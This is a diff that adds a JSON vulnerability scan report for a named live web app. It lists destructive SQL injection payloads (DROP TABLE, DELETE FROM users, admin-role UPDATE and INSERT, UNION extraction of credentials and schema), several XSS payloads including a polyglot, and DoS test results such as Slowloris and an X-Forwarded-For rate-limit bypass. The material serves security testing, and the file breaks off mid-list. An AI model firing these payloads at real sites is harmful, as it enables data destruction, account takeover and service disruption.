@@ -1,0 +1,3480 @@
+{
+  "meta": {
+    "generated_at": "2026-03-06T21:09:47.670613+00:00",
+    "upload_id": "",
+    "target_url": "https://carbon-iq-live.vercel.app",
+    "generator": "Prahaar_AI ReportService v1.0"
+  },
+  "scan_summary": {
+    "target": "https://carbon-iq-live.vercel.app",
+    "scan_time_utc": "2026-03-06T21:09:18.583868+00:00",
+    "duration_seconds": 11.991034,
+    "total_payloads_tested": 128,
+    "vulnerabilities_found": 1,
+    "overall_risk_level": "CRITICAL",
+    "total_vulnerabilities": 1,
+    "total_xss_vulnerabilities": 15,
+    "total_cors_misconfigurations": 0,
+    "total_ddos_vulnerabilities": 7,
+    "total_static_findings": 0,
+    "total_endpoints_crawled": 2,
+    "defense_rate": 96.9,
+    "cors_defense_rate": "N/A",
+    "xss_defense_rate": 100.0,
+    "ddos_defense_rate": 81.8
+  },
+  "vulnerabilities": [
+    {
+      "endpoint": "/",
+      "parameter": "input",
+      "vulnerability": "SQL Injection",
+      "risk_level": "CRITICAL",
+      "possible_attacks": [
+        "Privilege Escalation",
+        "Record Deletion",
+        "Table Drop",
+        "Malicious Data Insertion"
+      ],
+      "payloads_used": [
+        "'; UPDATE users SET role='admin' WHERE username='attacker' --",
+        "'; UPDATE users SET role='admin' WHERE 1=1 --",
+        "'; UPDATE users SET is_admin=1 WHERE username='attacker' --",
+        "'; DELETE FROM users --",
+        "'; DELETE FROM users WHERE 1=1 --",
+        "'; DELETE FROM sessions --",
+        "'; DROP TABLE users --",
+        "'; DROP TABLE sessions --",
+        "'; DROP TABLE IF EXISTS users --",
+        "'; INSERT INTO users (username,password,role) VALUES ('hacker','hacked','admin') --",
+        "'; INSERT INTO users VALUES (99,'hacker','hacked','admin') --"
+      ],
+      "evidence": [
+        "UPDATE-based privilege escalation appears possible (stacked queries accepted). Payload: '; UPDATE users SET role='admin' WHERE username='attacker' --",
+        "UPDATE-based privilege escalation appears possible (stacked queries accepted). Payload: '; UPDATE users SET role='admin' WHERE 1=1 --",
+        "UPDATE-based privilege escalation appears possible (stacked queries accepted). Payload: '; UPDATE users SET is_admin=1 WHERE username='attacker' --",
+        "DELETE-based data deletion appears possible. Payload: '; DELETE FROM users --",
+        "DELETE-based data deletion appears possible. Payload: '; DELETE FROM users WHERE 1=1 --",
+        "DELETE-based data deletion appears possible. Payload: '; DELETE FROM sessions --",
+        "DROP TABLE appears possible \u2013 schema destruction risk. Payload: '; DROP TABLE users --",
+        "DROP TABLE appears possible \u2013 schema destruction risk. Payload: '; DROP TABLE sessions --",
+        "DROP TABLE appears possible \u2013 schema destruction risk. Payload: '; DROP TABLE IF EXISTS users --",
+        "INSERT-based malicious data injection appears possible. Payload: '; INSERT INTO users (username,password,role) VALUES ('hacker','hacked','admin') --",
+        "INSERT-based malicious data injection appears possible. Payload: '; INSERT INTO users VALUES (99,'hacker','hacked','admin') --",
+        "UPDATE-based privilege escalation appears possible (stacked queries accepted). Payload: '; UPDATE users SET role='admin' WHERE username='attacker' --",
+        "UPDATE-based privilege escalation appears possible (stacked queries accepted). Payload: '; UPDATE users SET role='admin' WHERE 1=1 --",
+        "UPDATE-based privilege escalation appears possible (stacked queries accepted). Payload: '; UPDATE users SET is_admin=1 WHERE username='attacker' --",
+        "DELETE-based data deletion appears possible. Payload: '; DELETE FROM users --",
+        "DELETE-based data deletion appears possible. Payload: '; DELETE FROM users WHERE 1=1 --",
+        "DELETE-based data deletion appears possible. Payload: '; DELETE FROM sessions --",
+        "DROP TABLE appears possible \u2013 schema destruction risk. Payload: '; DROP TABLE users --",
+        "DROP TABLE appears possible \u2013 schema destruction risk. Payload: '; DROP TABLE sessions --",
+        "DROP TABLE appears possible \u2013 schema destruction risk. Payload: '; DROP TABLE IF EXISTS users --",
+        "INSERT-based malicious data injection appears possible. Payload: '; INSERT INTO users (username,password,role) VALUES ('hacker','hacked','admin') --",
+        "INSERT-based malicious data injection appears possible. Payload: '; INSERT INTO users VALUES (99,'hacker','hacked','admin') --"
+      ],
+      "database_hint": null,
+      "recommended_fix": "Use parameterized queries. Apply least-privilege DB roles. Disable stacked queries if possible. Use parameterized queries. Restrict DELETE permissions. Enable soft-delete patterns. Use parameterized queries. NEVER grant DROP privileges to application database users. Use parameterized queries. Validate all input server-side before insertion."
+    }
+  ],
+  "xss_vulnerabilities": [
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Reflected XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "q",
+      "method": "GET",
+      "payload": "<script>alert(1)</script>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Stored XSS",
+      "severity": "CRITICAL",
+      "endpoint": "/",
+      "parameter": "q",
+      "method": "GET",
+      "payload": "<script>alert('stored-xss')</script>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "JavaScript URI XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "q",
+      "method": "GET",
+      "payload": "&#106;avascript:alert(1)",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Mutation XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "q",
+      "method": "GET",
+      "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Polyglot XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "q",
+      "method": "GET",
+      "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Reflected XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "input",
+      "method": "GET",
+      "payload": "<script>alert(1)</script>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Stored XSS",
+      "severity": "CRITICAL",
+      "endpoint": "/",
+      "parameter": "input",
+      "method": "GET",
+      "payload": "<script>alert('stored-xss')</script>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "JavaScript URI XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "input",
+      "method": "GET",
+      "payload": "&#106;avascript:alert(1)",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Mutation XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "input",
+      "method": "GET",
+      "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Polyglot XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "input",
+      "method": "GET",
+      "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Reflected XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "search",
+      "method": "GET",
+      "payload": "<script>alert(1)</script>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Stored XSS",
+      "severity": "CRITICAL",
+      "endpoint": "/",
+      "parameter": "search",
+      "method": "GET",
+      "payload": "<script>alert('stored-xss')</script>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "JavaScript URI XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "search",
+      "method": "GET",
+      "payload": "&#106;avascript:alert(1)",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Mutation XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "search",
+      "method": "GET",
+      "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    },
+    {
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "xss_type": "Polyglot XSS",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "parameter": "search",
+      "method": "GET",
+      "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+      "confidence": "PROBABLE",
+      "source_file": "",
+      "source_line": 0,
+      "response_snippet": "'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage...."
+    }
+  ],
+  "cors_vulnerabilities": [],
+  "ddos_vulnerabilities": [
+    {
+      "vulnerability_type": "DDoS Vulnerability",
+      "attack_type": "HTTP Flood",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "observation": "Server accepted 200 requests within 0.8s without throttling. Avg response: 77ms, baseline: 38ms, errors: 0/200.",
+      "recommendation": "Implement request rate limiting or WAF protection.",
+      "details": {
+        "total_requests": 200,
+        "concurrency": 20,
+        "avg_response_ms": 77.3,
+        "max_response_ms": 777.7,
+        "baseline_ms": 38.2,
+        "errors": 0
+      }
+    },
+    {
+      "vulnerability_type": "DDoS Vulnerability",
+      "attack_type": "Slowloris",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "observation": "Server accepted 40/40 partial HTTP connections without enforcing connection timeouts. 40 connections remained alive after slow header injection.",
+      "recommendation": "Implement connection timeouts, limit concurrent connections per IP, or deploy a reverse proxy with Slowloris protection.",
+      "details": {
+        "connections_attempted": 40,
+        "connections_accepted": 40,
+        "connections_surviving": 40
+      }
+    },
+    {
+      "vulnerability_type": "DDoS Vulnerability",
+      "attack_type": "Large Payload",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "observation": "Server accepted a 10MB POST payload (status 405) without enforcing size limits.",
+      "recommendation": "Enforce request body size limits (e.g., 1\u20135MB max) at the web server or reverse proxy level.",
+      "details": {
+        "payload_size_mb": 10,
+        "status_code": 405
+      }
+    },
+    {
+      "vulnerability_type": "DDoS Vulnerability",
+      "attack_type": "Login Brute Force Flood",
+      "severity": "HIGH",
+      "endpoint": "/",
+      "observation": "Server accepted 100/100 login attempts without rate limiting or account lockout. Only 0 were blocked.",
+      "recommendation": "Implement login rate limiting, account lockout after failed attempts, CAPTCHA after repeated failures, and IP-based throttling.",
+      "details": {
+        "total_attempts": 100,
+        "successful_attempts": 100,
+        "blocked_attempts": 0
+      }
+    },
+    {
+      "vulnerability_type": "DDoS Vulnerability",
+      "attack_type": "Resource Exhaustion via File Upload",
+      "severity": "CRITICAL",
+      "endpoint": "/",
+      "observation": "Server accepted 30/30 file uploads without enforcing upload frequency or size restrictions.",
+      "recommendation": "Enforce upload rate limits, maximum file size, disk quota per user, and file type validation.",
+      "details": {
+        "total_uploads": 30,
+        "accepted": 30,
+        "rejected": 0
+      }
+    },
+    {
+      "vulnerability_type": "DDoS Vulnerability",
+      "attack_type": "Cache Bypass Flood",
+      "severity": "MEDIUM",
+      "endpoint": "/",
+      "observation": "Server recomputes responses for cache-busted requests. Avg cached: 36ms, avg busted: 62ms (difference: 26ms). An attacker could send requests with random parameters to bypass caching.",
+      "recommendation": "Implement cache key normalization to ignore unknown query parameters, or use a CDN with aggressive caching rules.",
+      "details": {
+        "avg_cached_ms": 36.0,
+        "avg_busted_ms": 62.3
+      }
+    },
+    {
+      "vulnerability_type": "DDoS Vulnerability",
+      "attack_type": "Rate Limit Bypass",
+      "severity": "CRITICAL",
+      "endpoint": "/",
+      "observation": "Rate limiting was bypassed using spoofed X-Forwarded-For headers. 50/50 requests succeeded.",
+      "recommendation": "Do not trust client-supplied headers (X-Forwarded-For) for rate limiting. Use the actual connection IP from the socket layer, or a trusted proxy header configured at the infrastructure level.",
+      "details": {
+        "bypass_header": "X-Forwarded-For",
+        "successful_requests": 50,
+        "total_requests": 50
+      }
+    }
+  ],
+  "defense_simulation": {
+    "summary": {
+      "total_attacks_analyzed": 128,
+      "attacks_blocked": 10,
+      "attacks_mitigated": 1,
+      "attacks_rate_limited": 113,
+      "attacks_allowed": 4,
+      "defense_rate": 96.9,
+      "by_technique": {
+        "Input Validation": 9,
+        "Query Pattern Detection": 1,
+        "Parameterized Query Enforcement": 1,
+        "Rate Limiting": 113
+      },
+      "by_action": {
+        "Blocked": 10,
+        "Allowed": 4,
+        "Mitigated": 1,
+        "Rate Limited": 113
+      }
+    },
+    "verdicts": [
+      {
+        "payload": "' OR 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Injection Pattern Detection",
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "' OR 'a'='a",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "admin' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Query Pattern Detection",
+        "explanation": "Known SQL injection pattern detected (Authentication Bypass). The payload matches a recognized injection technique. Request blocked.",
+        "rules_triggered": [
+          "Injection Pattern Detection"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "' OR '1'='1' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Injection Pattern Detection",
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "' OR ''='",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "1' OR '1'='1",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "') OR ('1'='1",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Allowed",
+        "defense_technique": "None",
+        "explanation": "No defense rule triggered \u2014 payload appears benign.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": false
+      },
+      {
+        "payload": "' OR 1=1#",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Injection Pattern Detection",
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "' OR 1=1/*",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "admin'/*",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Allowed",
+        "defense_technique": "None",
+        "explanation": "No defense rule triggered \u2014 payload appears benign.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": false
+      },
+      {
+        "payload": "' OR 1=1 -- -",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "\" OR 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Blocked",
+        "defense_technique": "Input Validation",
+        "explanation": "Input validation detected suspicious SQL keywords in the 'input' parameter. Request blocked.",
+        "rules_triggered": [
+          "SQL Keyword Input Validation",
+          "Injection Pattern Detection"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": true
+      },
+      {
+        "payload": "\" OR \"\"=\"",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Allowed",
+        "defense_technique": "None",
+        "explanation": "No defense rule triggered \u2014 payload appears benign.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": false
+      },
+      {
+        "payload": "' OR 'x'='x",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Mitigated",
+        "defense_technique": "Parameterized Query Enforcement",
+        "explanation": "Vulnerable query pattern detected. The 'input' parameter should use parameterized queries instead of string concatenation. Attack mitigated by query sanitization.",
+        "rules_triggered": [
+          "Parameterized Query Enforcement"
+        ],
+        "safe_query_example": "SELECT * FROM table WHERE input = ?",
+        "blocked": false
+      },
+      {
+        "payload": "') OR ('x'='x",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Allowed",
+        "defense_technique": "None",
+        "explanation": "No defense rule triggered \u2014 payload appears benign.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": false
+      },
+      {
+        "payload": "' UNION SELECT NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT username,password FROM users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT 1,2 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3,4 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION ALL SELECT NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION ALL SELECT NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION ALL SELECT NULL,NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT table_name FROM information_schema.tables --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT column_name FROM information_schema.columns --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL,table_name FROM information_schema.tables --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT sql,NULL FROM sqlite_master --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
